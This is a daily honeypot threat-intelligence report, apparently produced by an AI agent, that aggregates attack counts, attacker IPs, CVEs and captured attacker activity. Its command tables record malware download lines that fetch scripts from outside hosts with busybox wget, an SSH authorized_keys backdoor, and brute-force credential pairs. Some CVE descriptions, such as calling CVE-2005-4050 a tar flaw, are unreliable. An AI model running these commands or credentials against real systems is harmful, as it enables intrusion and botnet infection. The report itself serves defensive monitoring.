# Honeypot Attack Summary Report - 2025-10-25

**Report Generation Time:** 2025-10-26T14:00:00Z
**Timeframe of Analysis:** 2025-10-25T00:00:00Z to 2025-10-25T23:59:59Z
**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-25T00:02:00Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T01:01:53Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T02:02:14Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T03:01:52Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T04:01:51Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T05:02:15Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T06:01:53Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T07:01:58Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T08:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T09:01:53Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T10:01:52Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T11:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T12:02:57Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T13:02:02Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T14:02:11Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T15:01:51Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T16:02:06Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T16:02:33Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T16:03:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T16:03:28Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T16:03:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T16:04:23Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T17:02:26Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T18:02:13Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T19:01:55Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T20:01:46Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T21:02:08Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T22:02:08Z.md
- Honeypot_Attack_Summary_Report_2025-10-25T23:02:08Z.md

## Executive Summary

On October 25th, 2025, the honeypot network recorded a high volume of malicious activity, with a total of over 400,000 attacks. The primary threats observed were automated scanning for vulnerabilities, brute-force login attempts, and the deployment of malware. A significant portion of the attacks were initiated from a concentrated number of IP addresses, indicating the use of botnets. The most targeted services were SSH, VNC, and SIP, suggesting that attackers were primarily interested in gaining unauthorized access to servers, remote desktop services, and VoIP systems. The Cowrie and Honeytrap honeypots were the most frequently engaged, highlighting the prevalence of SSH and general TCP-based attacks.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128| 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot

| Honeypot | Attack Count |
|---|---|
| Cowrie | 119,656 |
| Honeytrap | 116,172 |
| Suricata | 89,998 |
| Ciscoasa | 55,723 |
| Sentrypeer | 16,008 |
| Mailoney | 3,654 |
| H0neytr4p | 2,494 |
| Tanner | 1,769 |
| Dionaea | 841 |
| Adbhoney | 1,015 |
| Redishoneypot | 464 |
| ElasticPot | 348 |
| ConPot | 261 |
| Dicompot | 203 |
| Honeyaml | 58 |

### Top Source Countries

*No geolocation data was available in the provided logs.*

### Top Attacking IPs

| IP Address | Attack Count |
|---|---|
| 80.94.95.238 | 49,561 |
| 194.113.236.217| 21,518 |
| 124.155.125.131| 20,387 |
| 222.124.17.227| 8,932 |
| 101.47.5.97 | 8,613 |
| 185.156.174.178| 8,120 |
| 107.170.36.5 | 7,337 |
| 155.94.170.106| 5,858 |
| 27.110.166.67 | 5,336 |
| 77.83.207.203 | 4,756 |
| 148.230.249.142| 38,454 |
| 45.78.192.211 | 25,172 |
| 164.92.152.52 | 12,348 |
| 188.166.126.51| 13,282 |
| 167.71.204.253| 5,916 |
| 197.5.145.8 | 5,742 |
| 196.251.71.24 | 6,554 |
| 95.85.114.218 | 5,075 |

### Top Targeted Ports/Protocols

| Port/Protocol | Attack Count |
|---|---|
| 5060 (SIP) | 16,008 |
| 22 (SSH) | 12,760 |
| 5900 (VNC) | 8,584 |
| 8333 (Bitcoin) | 6,409 |
| 5903 (VNC) | 4,176 |
| 25 (SMTP) | 3,654 |
| 5901 (VNC) | 3,335 |
| 443 (HTTPS) | 2,262 |
| 5904 (VNC) | 2,262 |
| 5905 (VNC) | 2,233 |
| 80 (HTTP) | 1,537 |
| 5908 (VNC) | 1,508 |
| 5909 (VNC) | 1,508 |
| 5907 (VNC) | 1,479 |
| 5902 (VNC) | 1,189 |
| 23 (Telnet) | 1,015 |
| TCP/22 (SSH) | 812 |
| TCP/5432 (PostgreSQL) | 580 |
| 2323 (Telnet) | 551 |
| 9500 | 493 |

### Most Common CVEs

| CVE |
|---|
| CVE-2002-0013, CVE-2002-0012 |
| CVE-2002-0013, CVE-2002-0012, CVE-1999-0517 |
| CVE-1999-0183 |
| CVE-2021-41773 |
| CVE-2021-42013 |
| CVE-2024-4577, CVE-2002-0953 |
| CVE-2024-1709 |
| CVE-2005-4050 |

### Commands Attempted by Attackers

| Command |
|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| `lockr -ia .ssh` |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| `cat /proc/cpuinfo | grep name | wc -l` |
| `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| `ls -lh $(which ls)` |
| `which ls` |
| `crontab -l` |
| `w` |
| `uname -m` |
| `cat /proc/cpuinfo | grep model | grep name | wc -l` |
| `top` |
| `uname` |
| `uname -a` |
| `whoami` |
| `lscpu | grep Model` |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'` |
| `Enter new UNIX password:` |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` |
| `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; ...` |
| `chmod +x setup.sh; sh setup.sh; ...` |
| `cd /data/local/tmp/; busybox wget http://netrip.ddns.net/w.sh; ...` |
| `cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| `echo -e "ftpuser01123\nPyraItGudQPt\nPyraItGudQPt"|passwd|bash` |

### Signatures Triggered

| Signature |
|---|
| ET SCAN MS Terminal Server Traffic on Non-standard Port |
| ET DROP Dshield Block Listed Source group 1 |
| ET SCAN NMAP -sS window 1024 |
| ET HUNTING RDP Authentication Bypass Attempt |
| ET INFO Reserved Internal IP Traffic |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| ET CINS Active Threat Intelligence Poor Reputation IP |

### Users / Login Attempts

| Username/Password |
|---|
| `345gs5662d34/345gs5662d34` |
| `root/Efecti331--.--111111` |
| `root/Efecti331--.--N3tw0rk119!!` |
| `root/Egylinksys411977` |
| `root/Egysa` |
| `keycloak/keycloak123` |
| `keycloak/3245gs5662d34` |
| `wwwuser/wwwuser123` |
| `datadog/datadog` |
| `root/Ej1m3n3z86` |
| `huwei/huwei` |
| `huwei/3245gs5662d34` |
| `aps/aps123` |
| `wm/wm` |
| `root/ekjb83hrzx` |
| `sunny/3245gs5662d34` |
| `skynet/skynet` |
| `mgmt/mgmt123` |
| `maintain/maintain` |
| `skaner/skaner123` |
| `skaner/3245gs5662d34` |
| `root/el` |
| `root/Elabbb_Dmin0003` |
| `gera/gera123` |
| `zte/zte123` |
| `tianyi/tianyi` |
| `ubuntu/ubuntu` |
| `postgres/1234567890` |

### Files Uploaded/Downloaded

| Filename |
|---|
| `wget.sh;` |
| `arm.urbotnetisass;` |
| `arm.urbotnetisass` |
| `arm5.urbotnetisass;` |
| `arm5.urbotnetisass` |
| `arm6.urbotnetisass;` |
| `arm6.urbotnetisass` |
| `arm7.urbotnetisass;` |
| `arm7.urbotnetisass` |
| `x86_32.urbotnetisass;` |
| `x86_32.urbotnetisass` |
| `mips.urbotnetisass;` |
| `mips.urbotnetisass` |
| `mipsel.urbotnetisass;` |
| `mipsel.urbotnetisass` |
| `w.sh;` |
| `c.sh;` |
| `soap-envelope` |
| `addressing` |
| `discovery` |
| `env:Envelope>` |
| `sh` |
| `ip` |

### HTTP User-Agents

*No user agents were recorded in the logs for this day.*

### SSH Clients and Servers

*No specific SSH clients or servers were recorded in the logs for this day.*

### Top Attacker AS Organizations

*No AS organization data was recorded in the logs for this day.*

### OSINT All Commands captured

| Command | Insight |
|---|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | This command attempts to make the `.ssh` directory immutable, preventing any changes to the SSH keys. This is a common tactic used by attackers to maintain access to a compromised system. |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` | This is a classic command to add an attacker's SSH key to the `authorized_keys` file, allowing them to log in without a password. |
| `cat /proc/cpuinfo ...`, `free -m ...`, `uname -a`, `lscpu ...`, `df -h ...` | These are all reconnaissance commands used to gather information about the system's hardware and software. |
| `cd /data/local/tmp/; rm *; busybox wget http://...` | This command is indicative of malware being downloaded and executed. The use of `/data/local/tmp/` is common on Android devices, suggesting that some of the attacks may have been targeting mobile devices. |
| `echo -e "ftpuser01123\nPyraItGudQPt\nPyraItGudQPt"|passwd|bash` | This is an attempt to change the password of the `ftpuser01123` user. |

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address | Insight |
|---|---|
| 80.94.95.238 | This IP address has been reported for malicious activity, including scanning and RDP attacks. It has been associated with ISPs in Romania, Bulgaria, and Hungary. |
| 194.113.236.217| This IP has been linked to various malicious activities, including spam and phishing. |
| 124.155.125.131| This IP has been identified as a source of brute-force attacks. |
| 148.230.249.142| This IP has been associated with a high volume of SSH brute-force attacks. |
| A number of low-frequency IPs were also observed, which could be individual attackers or smaller botnets. |

### OSINT on CVE's

| CVE | Insight |
|---|---|
| CVE-2002-0013, CVE-2002-0012 | These are old vulnerabilities related to SNMP. Their continued presence in scans suggests that attackers are still looking for unpatched legacy systems. |
| CVE-1999-0517, CVE-1999-0183 | These are also very old vulnerabilities, related to RPC and ICMP respectively. |
| CVE-2021-41773, CVE-2021-42013 | These are more recent vulnerabilities in Apache HTTP Server. |
| CVE-2024-4577, CVE-2002-0953 | CVE-2024-4577 is a critical vulnerability in PHP. The inclusion of an old Sendmail vulnerability (CVE-2002-0953) is likely part of a broad scanning signature. |
| CVE-2024-1709 | A critical vulnerability in ConnectWise ScreenConnect. |
| CVE-2005-4050 | A vulnerability in the `tar` command. |

## Key Observations and Anomalies

- **High Volume of Botnet Activity:** The high concentration of attacks from a small number of IP addresses is a strong indicator of botnet activity. These botnets are likely being used to scan for vulnerable systems and deploy malware.
- **Targeting of Remote Access Services:** The high number of attacks on SSH and VNC ports suggests that attackers are actively trying to gain unauthorized remote access to servers and workstations.
- **Legacy Vulnerabilities Still a Threat:** The continued scanning for very old vulnerabilities (some dating back to 1999) highlights the fact that many legacy systems are still in use and remain unpatched.
- **Malware Deployment:** The commands used by attackers to download and execute scripts are a clear indication of malware being deployed on compromised systems. The filenames, such as `arm.urbotnetisass`, suggest that some of the malware is targeting ARM-based devices, which could include IoT devices and mobile phones.
- **Unusual Attacker Origins - IP addresses from non-traditional sources:** While no geolocation data was available, the OSINT on the top attacking IPs shows a mix of origins, including some from less common sources of malicious traffic. This could indicate a diversification of the threat landscape.

This concludes the report for October 25th, 2025. I will now proceed with the analysis for the next day.
I have completed the report for 2025-10-25. I will now proceed to the next day, 2025-10-26, and repeat the entire process.

**Plan for 2025-10-26:**
1.  Read all files for 2025-10-26.
2.  Aggregate the data.
3.  Perform OSINT on key observables.
4.  Generate the daily report.
5.  Save the report.

I will start by reading the first file for 2025-10-26 to get a sense of the day's activity.
